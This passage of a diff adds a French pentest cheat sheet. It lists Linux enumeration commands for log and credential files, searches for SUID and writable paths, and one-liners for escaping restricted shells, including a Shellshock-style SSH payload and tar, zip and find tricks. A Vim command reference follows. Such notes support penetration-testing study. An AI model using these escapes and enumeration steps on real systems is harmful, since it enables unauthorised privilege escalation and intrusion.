+    cat /etc/httpd/logs/error_log
+    cat /etc/httpd/logs/error.log
+    cat /var/log/apache2/access_log
+    cat /var/log/apache2/access.log
+    cat /var/log/apache2/error_log
+    cat /var/log/apache2/error.log
+    cat /var/log/apache/access_log
+    cat /var/log/apache/access.log
+    cat /var/log/auth.log
+    cat /var/log/chttp.log
+    cat /var/log/cups/error_log
+    cat /var/log/dpkg.log
+    cat /var/log/faillog
+    cat /var/log/httpd/access_log
+    cat /var/log/httpd/access.log
+    cat /var/log/httpd/error_log
+    cat /var/log/httpd/error.log
+    cat /var/log/lastlog
+    cat /var/log/lighttpd/access.log
+    cat /var/log/lighttpd/error.log
+    cat /var/log/lighttpd/lighttpd.access.log
+    cat /var/log/lighttpd/lighttpd.error.log
+    cat /var/log/messages
+    cat /var/log/secure
+    cat /var/log/syslog
+    cat /var/log/wtmp
+    cat /var/log/xferlog
+    cat /var/log/yum.log
+    cat /var/run/utmp
+    cat /var/webmin/miniserv.log
+    cat /var/www/logs/access_log
+    cat /var/www/logs/access.log
+    ls -alh /var/lib/dhcp3/
+    ls -alh /var/log/postgresql/
+    ls -alh /var/log/proftpd/
+    ls -alh /var/log/samba/
+
+    Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+
+- Sortir d'un shell à commandes limitées grâce à Python :
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    echo os.system('/bin/bash')
+    /bin/sh -i
+
+- SUID / GUID :
+    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
+        # Looks in 'common' places : /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID.
+    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+        # find starting at /, SGID or SUID, no symbolic links, only 3 folders deep, with more detail
+
+- Lecture et écriture :
+    find / -writable -type d 2>/dev/null      # Écriture possible (version n°1)
+    find / -perm -222 -type d 2>/dev/null     # Écriture possible (version n°2)
+    find / -perm -o w -type d 2>/dev/null     # Écriture possible (version n°3)
+    find / -perm -o x -type d 2>/dev/null     # Exécution possible
+    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # Écriture et exécution possibles
+    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # Écriture possible
+    find /dir -xdev \( -nouser -o -nogroup \) -print   # Fichiers sans propriétaire
+
+- Langages installés :
+    find / -name perl*
+    find / -name python*
+    find / -name gcc*
+    find / -name cc
+
+- Possibilités pour l'upload de fichiers :
+    find / -name wget
+    find / -name nc*
+    find / -name netcat*
+    find / -name tftp*
+    find / -name ftp
+
+
+### Contourner un shell restreint :
+
+- sudo -l
+- printenv
+- echo $SHELL
+- “/” allowed ? => /bin/sh
+- “cp” allowed ? => cp /bin/sh ~
+- ftp / gdb / man / more / less / vim : "!/bin/sh"
+- rvim => :python import os; os.system("/bin/bash )
+- awk => awk 'BEGIN {system("/bin/sh")}'
+- find => find / -name test -exec /bin/sh \;
+- Python => python -c 'import os; os.system("/bin/sh")'
+- Php => php -a then exec("sh -i");
+- Perl => perl -e 'exec "/bin/sh";'
+- Lua => os.execute('/bin/sh').
+- Ruby => exec "/bin/sh"
+
+- SSH :
+    ssh username@IP - t "/bin/sh" or "/bin/bash"
+    ssh username@IP -t "bash --noprofile"
+    ssh username@IP -t "() { :; }; /bin/bash" # (Shellshock)
+    ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 # (SUID)
+
+- Git => git help status ; !/bin/bash
+- Pico => pico -s "/bin/bash" ; /bin/bash ; CTRL + T
+- Zip => zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
+- Tar => tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
+- Nmap => nmap --interactive ; !sh
+
+
+##############################
+#   VIM
+##############################
+
+    +++ Configuration +++
+
+    • Éditer le fichier $HOME/.vimrc pour changer les options de Vim
+    • Taper « :set nu » en mode Normal pour afficher les numéros de ligne
+    • Taper « :set ic » en mode Normal pour ignorer la casse lors des recherches
+    • Taper « :syntax on » en mode Normal pour activer la coloration syntaxique
+
+    +++ Commandes en mode Normal +++
+
+        +++ Modification +++
+
+        • dd => Effacer une ligne entière
+        • dXd => Effacer X lignes
+        • dw => Effacer un mot
+        • dXw => Effacer X mots
+        • d$ => Effacer jusqu’à la fin de la ligne en partant de la position du curseur
+        • y{motion} => Copier (yank), {motion} = Toutes les options utilisables avec les autres commandes (comme ‘d’)
+            ◦ Exemples : ‘y4’ copie 4 lignes, ‘yy’ en copie 1, ‘y$’ copie jusqu’à la fin de la ligne, etc.
+        • p => Coller quelque chose copié par y ou effacé par d
+        • u => Annuler la dernière modification sur un caractère
+        • U => Annuler toutes les dernières modifications que l’on a effectuées consécutivement sur une ligne
+        • c{motion] = « Changer jusqu’à ».
+            ◦ Exemple : ‘c$’ va nous mettre en mode remplacement jusqu’à la fin de la ligne
+
+        +++ Déplacement +++
+
+        • % => Permet de se téléporter au [, ( ou { correspondant
+        • gg => Aller au début du fichier
+        • G => Aller à la fin du fichier
+        • xxxG => Aller à la ligne xxx du fichier
+        • $ => Aller à la fin de la ligne
+        • 0 => Aller au début de la ligne
+
+        +++ Recherche et remplacement +++
+
+        • /texte => Rechercher « texte » dans le fichier
+        • n => Prochaine occurrence (next)
+        • N => Précédente occurrence (shift n)
+        • / ? => Directement chercher en direction opposée
+        • « :s/ancien/nouveau » => Remplace « ancien » par « nouveau » sur la première occurrence trouvée
+        • «  :s/ancien/nouveau/g » remplace sur toutes les occurrences présentes dans la ligne
+        • «  :s/ancien/nouveau/gc » remplace sur toutes les occurrences présentes dans la ligne en demandant une confirmation à chaque fois
+        • « :#,#s/ancien/nouveau/g » remplace sur toutes les occurrences présentes dans la plage de lignes indiquée par les # (« 1,10 » => Lignes 1 à 10, etc)
+        • « :%s/ancien/nouveau » remplace les occurrences dans tout le fichier
+
+        +++ Données, commandes et autres fichiers +++
+
+        • :5,56w FICHIER => Enregistrer les lignes de 5 à 56 dans le fichier FICHIER
+        • :! COMMANDE => Exécuter une commande externe qui s’affichera temporairement
+        • :r FICHIER => Récupérer le fichier FICHIER et l’insérer dans le fichier courant à partir de la position du curseur
+        • :r! COMMANDE => Insérer le résultat de la commande COMMANDE à partir de la position du curseur
+        • Ctrl-W => Sauter d’un fichier à l’autre lorsque plusieurs sont ouverts en même temps
+        • F1 => Ouvrir le fichier d’aide de Vim. Quitter avec :q!
+        • Ctrl-D => Autocompléter une commande
